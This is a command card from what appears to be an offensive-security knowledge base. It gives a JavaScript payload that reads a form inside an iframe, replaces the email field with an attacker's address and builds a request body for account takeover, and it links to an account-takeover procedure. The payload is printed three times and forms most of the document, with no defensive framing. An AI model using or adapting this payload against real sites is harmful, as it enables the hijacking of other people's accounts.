---
id: cmd-form-extract-modify
data: >-
  forms = ifr.contentDocument.getElementsByTagName("form")[5];inputs =
  forms.getElementsByTagName("input");body = "";for(var i =0; i < inputs.length;
  i++){if(inputs[i].name=="email"){inputs[i].value="keerok%40protonmail.com";}body
  +=inputs[i].name+"="+inputs[i].value+"&";}body +=
  "_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D";
tags:
  - form
  - manipulation
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.794Z'
verified: false
validated: true
submitted: true
---
# form-data-extraction-modify

## Command

```javascript
forms = ifr.contentDocument.getElementsByTagName("form")[5];inputs = forms.getElementsByTagName("input");body = "";for(var i =0; i < inputs.length; i++){if(inputs[i].name=="email"){inputs[i].value="keerok%40protonmail.com";}body +=inputs[i].name+"="+inputs[i].value+"&";}body += "_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D";
```

## Description

Selects the 6th form (index 5), extracts all inputs, modifies email to attacker's, builds URL-encoded body string.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| form_index | 5 | Yes |
| email_override | "keerok%40protonmail.com" | Yes |

## Examples

### Basic Usage

```javascript
forms = ifr.contentDocument.getElementsByTagName("form")[5];inputs = forms.getElementsByTagName("input");body = "";for(var i =0; i < inputs.length; i++){if(inputs[i].name=="email"){inputs[i].value="keerok%40protonmail.com";}body +=inputs[i].name+"="+inputs[i].value+"&";}body += "_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D";
```

## Expected Output

Body string with form data, email changed.

## Related

- [[procedures/Perform-Account-Takeover-via-Form-Manipulation]]
